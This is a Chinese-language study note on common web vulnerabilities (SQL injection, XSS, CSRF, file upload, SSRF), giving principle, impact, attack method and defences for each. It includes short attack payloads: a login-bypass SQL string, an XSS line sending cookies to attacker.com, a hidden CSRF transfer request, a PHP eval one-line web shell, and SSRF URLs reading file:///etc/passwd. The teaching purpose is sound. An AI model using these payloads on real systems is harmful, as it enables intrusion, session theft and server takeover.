---
title: web security-常见漏洞
date: 2026-03-26 09:34:32
categories:
    - web-security
    - web 安全-常见漏洞
tags: 
---

## 前言

这篇文章主要记载web安全中的常见漏洞，不限于原理、影响、危害和解决方法

- Broken Access Control
- Security Misconfiguration
- Software Supply Chain Failures
- Cryptogaphic Failures
- Injection
- Insecure Design
- Authentication Failures
- Software or Data Integrity Failures
- Mishanding of Exceptional Conditions

## SQL 注入

**<a style="color:red">原理:</a>**

SQL 注入发生在 Web 应该程序对用户输入的数据缺乏严格的过滤或转义，直接将其拼接到 SQL查询语句中。导致攻击者可以闭合原有的 SQL 语句，并插入恶意的 SQL 代码，使得数据库执行了攻击者预期的操作。

**<a style="color:red">危害：</a>**

窃取/篡改数据库数据、提权、服务器接管、拒绝服务

**<a style="color:red">攻击方法:</a>**

攻击者通常会在输入框（如登录框、搜索框）或URL参数中输入特殊构造的字符串

- 绕过：输入```admin' OR '1'='1' --```后端的 SQL 语句可能变成 `SELECT * FROM users WHERE username = 'admin' OR '1'='1' -- AND password = ''`因为`'1'='1'`永远为真，且 -- 注释掉了后面的密码校验，攻击者就不需要密码即可登录
- 数据窃密：使用`UNION SELECT`将恶意查询的结果拼接到正常查询结果中，从而读取数据库版本、标明、列名以及敏感数据
- 盲注：在页面没用错误回显时，通过布尔条件或时间延迟来逐个字符地推断数据库信息

**<a style="color:red">防御方法：</a>**

- 预编译处理：将 SQL 语句的代码与数据分离，即使数据库中含有 SQL 关键字，也会被作纯文本处理
- 使用 ORM 框架：现在 Web 开发框架（如MyBatis、Hibernate、Entity Frameword）默认使用参数化查询，能大大降低注入风险
- 输入验证：采用白名单、正则机制过滤输入
- 最小权限：严禁使用 root 或 sa 账户

## XSS（跨站脚本攻击）

**<a style="color:red">原理 ：</a>**

用户输入的恶意JS代码未转义，直接输出到HTML页面，浏览器解析时作为脚本执行（包括存储型/反射性/DOM型）

**<a style="color:red">危害：</a>**

窃取用户 Cookie/会话、钓鱼、键盘记录、网站挂马、挖矿、传播蠕虫

**<a style="color:red">攻击方法：</a>**

- 反射型 XSS：恶意脚本作为 URL 参数发送给服务器，服务器将其“反射”回页面。攻击者需诱导受害者点击构造好的恶意连接。URL参数例如`<script>alert(document.cookie)</script>`

- 存储型 XSS：恶意脚本被永久存储在目标服务器的数据库中，任何访问该内容的受害者都会触发脚本执行。危害最大。留言板输入`<img src=x onerror=alert(1)>`查看即触发

- DOM型 XSS：窃取用户的 Cookie（获取会话凭证从而接管账户）、页面钓鱼、强制用户执行非预期操作。`location.hash`直接innerHTML

- 或使用`"><script>fetch('http://attacker.com?cookie='+document.cookie)</script">`获取cookie

**<a style="color:red">防御方法：</a>**

- 输出编码：在将用户数据渲染到 HTML、js或CSS环境前，进行严格的 HTML 实体编码，将 < 转换为 `&lt;`
- Cookie 安全属性：为敏感的 Cookie 设置`HttpOnly`标志，防止 js 通过 `document.cookie`读取到会话ID
- 内容安全策略 CSP：通过HTTP头配置CSP，限制浏览器只能加载和执行可信来源的脚本，有效阻断 XSS 攻击

## CSRF (跨站请求伪造)

**<a style="color:red">原理 ：</a>**

攻击者诱导已经登录目标网站的受害者，在不知情的情况下，利用受害者浏览器的身份凭证也就是 Cookie，向目标网站发送恶意请求，服务器在接收到请求时，会误认为是受害者的自发行为并执行

**<a style="color:red">危害：</a>**

模拟受害者身份执行恶意操作，如转账、改密码、删帖等一系列高危操作，导致资金损失，账号被控

**<a style="color:red">攻击方法：</a>**

- 假如一名受害者登录的银行的网站：bank.com，攻击者构造了一个恶意网页，其中包含着一个恶意的请求代码`<img src="http://bank.com/transfer?amount=1000&to=hacker_account" style="display:none;">`如果受害者在未退出银行账户的情况下访问了攻击者的网页，浏览器会自动携带bank.com的cookie发起这个转账请求，导致资金被窃取

- 表单自动提交`<form action="http://target.com/change_pwd" method="POST">`+js submit，以上结合 XSS 会更隐蔽，受害者更不容易发现

**<a style="color:red">防御方法：</a>**

- Anti-CSRF Token：服务器在表单中植入一个随机生成且不可预测的 Token，并在处理请求时验证该 Token，攻击者不能跨域或者该 Token，所以无法伪造合法请求
- SameSite Cookie 属性：将 Cookie 的 samesite 属性设置为 strice 或 Lax，限制第三方网站发起的请求携带 Cookie
- 验证 Referer 和 Origin 头：检查 http 请求头中的来源地址，确保请求是自家的业务域名发出

## 文件上传漏洞

**<a style="color:red">原理 ：</a>**

大多数网站都会提供文件上传的功能（如上传图片、上传头像附件等），但后端代码没有对上传的文件类型、内容、扩展名进行严格的安全校验。这允许攻击者上传恶意的可执行脚本文件 WebShell 到服务器的 Web 目录中

**<a style="color:red">危害：</a>**

上传 WebShell 控制服务器、挂马、钓鱼、Dos

**<a style="color:red">攻击方法：</a>**

- 一个一句话木马，php中的`<?php @eval($_POST['cmd']);?>`
- 通过修改文件名后缀，上传 shell.php 伪装成 shell.jpg，在通过bp抓包改包、利用服务器解析漏洞（如 Apache 解析漏洞、Nginx 空字节注入）等方式成功上传木马
- 上传成功后，访问 /uploads/shell.php 执行，传入系统命令参数从而获取服务器控制权

**<a style="color:red">防御方法：</a>**

- 白名单扩展名校验：不能使用黑名单（如 .php5，.phtml等），需严格规定上传的特定格式（如 .jpg、.png、.pdf）
- MIME类型与文件头校验：不仅检查后缀，还需检查HTTP请求头中的`Content-Type`和文件内的魔数
- 重命名文件：将上传的文件重命名为随机字符串，并隐藏真实路径，防止攻击者猜解文件 URL
- 存储非 Web 目录 + 禁用执行权限：将上传的文件存储在专门的静态资源服务器或阿里云存储上；如需上传本地，需确保目录绝对没有执行服务器端脚本的执行权限

## SSRF（服务端请求伪造）

**<a style="color:red">原理 ：</a>**

漏洞形成于Web应用提供了从其他服务器获取数据的功能，但没有对目标地址做严格过滤与限制。攻击者借此可以将存在漏洞的Web服务器作为跳板，去攻击外网无法直接访问的内部系统

**<a style="color:red">危害：</a>**

内网渗透、读取本地文件/云元数据、端口扫描、间接RCE、攻击内部服务

**<a style="color:red">攻击方法：</a>**

- 攻击者将URL 参数修改为内容地址。如视图功能为`http://example.com/fetch_image?url=http://attacker.com/image.jpg`
- 攻击者将其修改为`url=http://127.0.0.1:6379`（尝试探测内容 Redis 服务）或`url=http://192.168.1.x/admin`
- 利用 SSRF，攻击者进行内网端口扫描、攻击内网脆弱应用、读取本地文件，利用`file:///etc/passwd`协议等
- 协议：gopher://、dict:// 发起 Redis 命令执行

**<a style="color:red">防御方法：</a>**

- 严格黑白名单：对输入的 URL 进行解析，确保ip地址不在内网网段；10.0.0.0/8 127.0.0.0/8等
- 禁用协议：允许 HTTP 和 HTTPS 请求，禁用 `file://` `dict://` `gopher://`等可能被用于漏洞利用的协议
- 统一错误信息：避免将服务器获取外部资源时的详细错误信息直接返回前端，防止被用来进行端口盲打推断

